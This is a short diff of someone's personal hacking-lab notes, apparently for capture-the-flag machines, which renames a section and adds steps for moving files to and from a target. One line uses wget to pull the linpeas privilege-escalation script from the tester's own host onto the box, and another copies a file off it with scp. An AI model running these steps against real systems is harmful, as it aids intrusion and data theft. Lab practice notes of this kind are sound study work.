@@ -194,7 +194,7 @@ chmod 600 key
 
 ssh -i key kay@10.10.122.69
 
-## linpeas
+## upload files to box
 
 host on own computer
 ls to directory
@@ -207,4 +207,10 @@ get on box
 
 ```
 wget http://10.4.9.144:8000/linpeas.sh
+```
+## download files from box
+
+on own machine
+```
+scp james@10.10.165.113:Alien_autospy.jpg /home/kali/Downloads
 ```
